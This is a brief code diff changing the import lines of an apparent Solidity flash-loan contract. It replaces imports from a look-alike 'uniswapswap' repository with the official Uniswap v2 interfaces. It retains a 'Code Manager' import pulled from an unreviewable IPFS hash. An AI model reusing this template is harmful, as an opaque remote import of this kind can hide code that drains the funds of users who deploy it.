@@ -5,9 +5,9 @@ import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contra
 import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
 
 // uniswapSwap Smart Contracts
-import "https://github.com/uniswapswap/uniswap-swap-core/blob/master/contracts/interfaces/IuniswapCallee.sol";
-import "https://github.com/uniswapswap/uniswap-swap-core/blob/master/contracts/interfaces/IuniswapFactory.sol";
-import "https://github.com/uniswapswap/uniswap-swap-core/blob/master/contracts/interfaces/IuniswapPair.sol";
+import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
+import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
+import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
 
 // Code Manager
 import "ipfs://QmeLmYPsbe1j9E92S7TbmhpVAWGvUSe7hHite3dnk3pn8d";
